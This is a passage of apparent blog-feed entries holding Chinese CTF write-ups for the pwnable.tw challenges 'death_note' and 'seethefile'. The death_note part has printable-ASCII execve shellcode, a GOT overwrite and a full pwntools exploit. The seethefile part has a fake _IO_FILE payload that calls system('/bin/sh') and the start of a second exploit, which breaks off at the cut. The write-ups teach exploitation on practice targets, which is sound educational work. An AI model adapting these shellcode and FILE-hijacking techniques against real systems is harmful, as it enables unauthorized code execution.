        <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file death_note </span><br><span class="line">death_note: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;547f3a1cf19ffe5798d45def2f4bc5c585af88f5, not stripped</span><br><span class="line">$ checksec death_note </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>32位程序，没去符号表，只开了canary</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note()"></a>add_note()</h3><p>index不能大于10，会检查name是否为可打印字符，同时会malloc一块地址用于存储字符串内容，将地址保存在note[index]数组中，但是index可以为负数，会造成数组越界</p><h3 id="show-note"><a href="#show-note" class="headerlink" title="show_note()"></a>show_note()</h3><p>读取地址指向的内容，同样存在数组越界的问题</p><h3 id="del-note"><a href="#del-note" class="headerlink" title="del_note()"></a>del_note()</h3><p>会free掉那块内存并清零指针</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>read_int()函数中没有检查index是否为负数，使得数组越界造成任意地址写</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们可以构造出全是可见字符的shellcode，然后将got表地址改为我们需要执行的指令入口即可</p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>常见的shellcode思路是利用int 80h陷入软中断，</p><p>并使得eax内容为0x0b，ebx指向一个字符串”/bin/sh”，ecx、edx置0。如shellcraft.sh()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* execve(path&#x3D;&#39;&#x2F;bin&#x2F;&#x2F;&#x2F;sh&#39;, argv&#x3D;[&#39;sh&#39;], envp&#x3D;0) *&#x2F;</span><br><span class="line">&#x2F;* push &#39;&#x2F;bin&#x2F;&#x2F;&#x2F;sh\x00&#39; *&#x2F;</span><br><span class="line">push 0x68</span><br><span class="line">push 0x732f2f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx, esp</span><br><span class="line">&#x2F;* push argument array [&#39;sh\x00&#39;] *&#x2F;</span><br><span class="line">&#x2F;* push &#39;sh\x00\x00&#39; *&#x2F;</span><br><span class="line">push 0x1010101</span><br><span class="line">xor dword ptr [esp], 0x1016972</span><br><span class="line">xor ecx, ecx</span><br><span class="line">push ecx &#x2F;* null terminate *&#x2F;</span><br><span class="line">push 4</span><br><span class="line">pop ecx</span><br><span class="line">add ecx, esp</span><br><span class="line">push ecx &#x2F;* &#39;sh\x00&#39; *&#x2F;</span><br><span class="line">mov ecx, esp</span><br><span class="line">xor edx, edx</span><br><span class="line">&#x2F;* call execve() *&#x2F;</span><br><span class="line">push SYS_execve &#x2F;* 0xb *&#x2F;</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>但是由于本题的限制，并不能直接使用</p><p>根据某师傅博客中写到，此题可用的汇编指令如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">1.数据传送:</span><br><span class="line">push&#x2F;pop eax…</span><br><span class="line">pusha&#x2F;popa</span><br><span class="line"></span><br><span class="line">2.算术运算:</span><br><span class="line">inc&#x2F;dec eax…</span><br><span class="line">sub al, 立即数</span><br><span class="line">sub byte ptr [eax… + 立即数], al dl…</span><br><span class="line">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">sub dword ptr [eax… + 立即数], esi edi</span><br><span class="line">sub word ptr [eax… + 立即数], si di</span><br><span class="line">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">sub si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">3.逻辑运算:</span><br><span class="line">and al, 立即数</span><br><span class="line">and dword ptr [eax… + 立即数], esi edi</span><br><span class="line">and word ptr [eax… + 立即数], si di</span><br><span class="line">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class="line">and esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">and si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">xor al, 立即数</span><br><span class="line">xor byte ptr [eax… + 立即数], al dl…</span><br><span class="line">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">xor dword ptr [eax… + 立即数], esi edi</span><br><span class="line">xor word ptr [eax… + 立即数], si di</span><br><span class="line">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">xor si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">4.比较指令:</span><br><span class="line">cmp al, 立即数</span><br><span class="line">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class="line">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class="line">cmp word ptr [eax… + 立即数], si di</span><br><span class="line">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">cmp si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">5.转移指令:</span><br><span class="line">push 56h</span><br><span class="line">pop eax</span><br><span class="line">cmp al, 43h</span><br><span class="line">jnz lable</span><br><span class="line"></span><br><span class="line">&lt;&#x3D;&gt; jmp lable</span><br><span class="line"></span><br><span class="line">6.交换al, ah</span><br><span class="line">push eax</span><br><span class="line">xor ah, byte ptr [esp] &#x2F;&#x2F; ah ^&#x3D; al</span><br><span class="line">xor byte ptr [esp], ah &#x2F;&#x2F; al ^&#x3D; ah</span><br><span class="line">xor ah, byte ptr [esp] &#x2F;&#x2F; ah ^&#x3D; al</span><br><span class="line">pop eax</span><br><span class="line"></span><br><span class="line">7.清零:</span><br><span class="line">push 44h</span><br><span class="line">pop eax</span><br><span class="line">sub al, 44h ; eax &#x3D; 0</span><br><span class="line"></span><br><span class="line">push esi</span><br><span class="line">push esp</span><br><span class="line">pop eax</span><br><span class="line">xor [eax], esi ; esi &#x3D; 0</span><br></pre></td></tr></table></figure><p>我们可以先看看执行shellcode时的寄存器状况（断在了地址0x080487ef，即 call puts</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-deathnote-1.png"  alt=""></p><p>可以发现，edx寄存器地址是shellcode的起始地址，而ebx、ecx的值是0，可以用来置0</p><p>我们可以修改shellcode如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* execve(path&#x3D;&#39;&#x2F;bin&#x2F;&#x2F;&#x2F;sh&#39;, argv&#x3D;0, envp&#x3D;0) *&#x2F;</span><br><span class="line">    &#x2F;* push &#39;&#x2F;bin&#x2F;&#x2F;&#x2F;sh\x00&#39; *&#x2F;</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    push esp</span><br><span class="line">    pop ebx</span><br><span class="line">   &#x2F;*rewrite shellcode to get &#39;int 80&#39;*&#x2F;</span><br><span class="line">   &#x2F;* int 80 &#x3D; \xcd\x80 *&#x2F;</span><br><span class="line">    push edx</span><br><span class="line">    pop eax</span><br><span class="line">    push 0x60606060</span><br><span class="line">    pop edx</span><br><span class="line">    sub byte ptr[eax + 0x35] , dl</span><br><span class="line">    sub byte ptr[eax + 0x35] , dl</span><br><span class="line">    sub byte ptr[eax + 0x34] , dl</span><br><span class="line">    push 0x3e3e3e3e</span><br><span class="line">    pop edx</span><br><span class="line">    sub byte ptr[eax + 0x34] , dl</span><br><span class="line">    &#x2F;*set zero to edx*&#x2F;</span><br><span class="line">    push ecx</span><br><span class="line">    pop edx</span><br><span class="line">   &#x2F;*set 0x0b to eax*&#x2F;</span><br><span class="line">    push edx</span><br><span class="line">    pop eax</span><br><span class="line">    xor al, 0x40</span><br><span class="line">    xor al, 0x4b    </span><br><span class="line">  &#x2F;*foo order,for holding the  place*&#x2F;</span><br><span class="line">    push edx</span><br><span class="line">    pop edx</span><br><span class="line">    push edx</span><br><span class="line">    pop edx</span><br></pre></td></tr></table></figure><h3 id="修改got表"><a href="#修改got表" class="headerlink" title="修改got表"></a>修改got表</h3><p>我们可以直接修改puts的got表，可以看到note的地址是0x0804A060，而我们只需要获得puts的got表地址，将它们相减并除以4即可</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>我们需要获得的是32位汇编，所以不要把arch置为amd64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch='amd64',os='linux',log_level='debug')</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./death_note"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./death_note"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10201</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line">addnote = <span class="keyword">lambda</span> index,name : (sla(<span class="string">"choice :"</span>,<span class="string">"1"</span>),sla(<span class="string">"Index :"</span>, str(index)),sla(<span class="string">"Name :"</span>,name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">note_addr = <span class="number">0x0804a060</span></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">    /* execve(path='/bin///sh', argv=['sh'], envp=0) */</span></span><br><span class="line"><span class="string">    /* push '/bin///sh\x00' */</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    push 0x732f2f2f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    push esp</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    push 0x60606060</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    sub byte ptr[eax + 0x35] , dl</span></span><br><span class="line"><span class="string">    sub byte ptr[eax + 0x35] , dl</span></span><br><span class="line"><span class="string">    sub byte ptr[eax + 0x34] , dl</span></span><br><span class="line"><span class="string">    push 0x3e3e3e3e</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    sub byte ptr[eax + 0x34] , dl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    xor al, 0x40</span></span><br><span class="line"><span class="string">    xor al, 0x4b    </span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode = asm(shellcode) + <span class="string">'\x6b\x40'</span></span><br><span class="line"></span><br><span class="line">index = (puts_got - note_addr)/<span class="number">4</span></span><br><span class="line">addnote(index,shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="http://p4nda.top/2017/09/29/pwnable-tw-deathnote/" target="_blank" rel="noopener">【PWNABLE.TW】 deathnote 解题思路</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-seethefile-栈溢出构造fake-FILE</title>
      <link href="2020/11/28/pwnable-tw-seethefile-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%9E%84%E9%80%A0fake-FILE/"/>
      <url>2020/11/28/pwnable-tw-seethefile-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%9E%84%E9%80%A0fake-FILE/</url>
      
        <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ file seethefile </span><br><span class="line">seethefile: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;04e6f2f8c85fca448d351ef752ff295581c2650d, not stripped</span><br><span class="line">$ checksec seethefile </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位程序，只开了NX，没去符号表</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序提供的功能是可以打开、读取、打印、关闭文件，但是一次只能读取0x18F个字节，且有检测不能读取flag文件</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>程序在输入和读取的地方都做好了边界控制，但是在程序退出时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Leave your name :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;name);</span><br></pre></td></tr></table></figure><p>这里没有检查输入name的长度，导致可以覆盖name后面的内存。位于bss段的name后面就是那个文件的fp指针，之后又去调用了fclose并传入了这个fp指针，这里就是漏洞点所在。</p><h2 id="前置知识之-IO-FILE"><a href="#前置知识之-IO-FILE" class="headerlink" title="前置知识之__IO_FILE"></a>前置知识之__IO_FILE</h2><p>在利用之前，我们先来学习<code>_IO_FILE</code>。不过在学<code>IO_FILE</code>之前，我们先了解两个函数<code>open</code>和<code>fopen</code>：</p><ul><li><a href="https://www.jianshu.com/p/5bccc0a0bbbf" target="_blank" rel="noopener">总结open与fopen的区别</a></li><li><a href="https://stackoverflow.com/questions/1658476/c-fopen-vs-open" target="_blank" rel="noopener">C fopen vs open</a></li><li><a href="https://blog.csdn.net/qq_38374864/article/details/72903920" target="_blank" rel="noopener">Linux（C/C++）下的文件操作open、fopen与freopen</a></li><li><a href="https://blog.csdn.net/LEON1741/article/details/78091974" target="_blank" rel="noopener">C语言中open与fopen的的解释和区别</a></li><li><a href="https://blog.csdn.net/xzhKSD123/article/details/96167556" target="_blank" rel="noopener">C语言中文件描述符和文件指针的本质区别</a></li></ul><table><thead><tr><th align="left"></th><th align="left">文件描述符（低级IO）</th><th align="left">文件流/文件指针（高级IO）</th></tr></thead><tbody><tr><td align="left">标准</td><td align="left">POSIX</td><td align="left">ANSI C</td></tr><tr><td align="left">层次</td><td align="left">系统调用</td><td align="left">libc</td></tr><tr><td align="left">数据类型</td><td align="left">int</td><td align="left">FILE *</td></tr><tr><td align="left">函数</td><td align="left">open/close/read/write</td><td align="left">fopen/fclose/fread/fwrite/fseek</td></tr></tbody></table><p>所以要学习的<code>_IO_FILE</code>就是fopen这套libc实现的高级IO操作相关的一个结构体<code>_IO</code>是值其所在是libc的IO库中，所以说的FILE结构体值指的就是<code>_IO_FILE</code>，在stdio.h的头文件中有typedef：</p><blockquote><p>/usr/include/stdio.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> __<span class="title">FILE</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stdin</span>;</span><span class="comment">/* Standard input stream.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stdout</span>;</span><span class="comment">/* Standard output stream.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stderr</span>;</span><span class="comment">/* Standard error output stream.  */</span></span><br></pre></td></tr></table></figure><p>至此我们可以开心的学习<code>_IO_FILE</code>了</p><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/" target="_blank" rel="noopener">FILE Structure Description</a></li><li><a href="https://b0ldfrev.gitbook.io/note/pwn/iofile-li-yong-si-lu-zong-jie" target="_blank" rel="noopener">_IO_FILE利用思路总结</a></li><li><a href="http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/" target="_blank" rel="noopener">_IO_FILE部分源码分析及利用</a></li><li><a href="http://blog.eonew.cn/archives/1103" target="_blank" rel="noopener">IO FILE 之劫持vtable及FSOP</a></li><li><a href="https://xz.aliyun.com/t/6567" target="_blank" rel="noopener">IO file结构在pwn中的妙用</a></li></ul><p>一句话概括为啥要研究<code>_IO_FILE</code>：<strong>libc实现的文件流机制中存在可以被改写的函数指针</strong></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>所以我们的核心思路是构造fake FILE，从而使得fclose执行<code>system(&#39;/bin/sh&#39;)</code></p><h3 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h3><p>libc的泄漏很简单，我们可以直接利用linux的proc伪文件系统读取<code>/proc/self/maps</code>即可获得libc基址，不过本地和远程的布局可能有些许的不同，因为一次最多只能读取0x18f个字节，所以我们获取到一个地址后，加上偏移即可得到libc基址</p><p>一般我们读取的是/proc/[pid]/maps，可以获取任意进程的映射信息，这里我们使用self是为了获取当前进程的内存映射关系</p><h3 id="fake-FILE"><a href="#fake-FILE" class="headerlink" title="fake FILE"></a>fake FILE</h3><p>几个IO_FILE的知识：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、_IO_FILE结构大小为0x94（32位）</span><br><span class="line">2、_flags&amp;0x2000为0就会直接调用_IO_FINSH(fp),_IO_FINSH(fp)相当于调用fp-&gt;vtable-&gt;_finish(fp)</span><br><span class="line">3、将fp指向一块内存p,p偏移0的前4个字节设置为0xffffdfff,p偏移4的位置放上参数&#39;;&#x2F;bin&#x2F;sh&#39;(字符要以;开头)；p偏移sizeof(_IO_FILE)大小位置(vtable)覆盖为内存q,q的2*4字节处(vtable-&gt;_finish)覆盖为system即可</span><br><span class="line">4、vtable是个虚标指针，里面一般性是21or23个变量，我们需要改的是第三个，别的填充些正常的地址就好</span><br></pre></td></tr></table></figure><p>需要注意的是，我们这里的libc版本是2.23，2.24以上的版本会对虚表进行检查，需要绕过</p><p>故伪造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fakeFILE = <span class="number">0x0804B284</span></span><br><span class="line">payload  = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(fakeFILE)</span><br><span class="line">payload += p32(<span class="number">0xffffdfff</span>)</span><br><span class="line">payload += <span class="string">";$0"</span>+<span class="string">'\x00'</span>*<span class="number">0x8d</span></span><br><span class="line">payload += p32(fakeFILE+<span class="number">0x98</span>)</span><br><span class="line">payload += p32(system_addr)*<span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>需要注意的是，我们在本地leak出来的libc基址和目标文件的基址并不一样，要一样可能需要使用docker调试</p><p>有意思的是，我们获取shell之后并不能直接cat flag直接获取，应该是为了防止非预期，需要./get_flag获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./seethefile"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./seethefile"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span 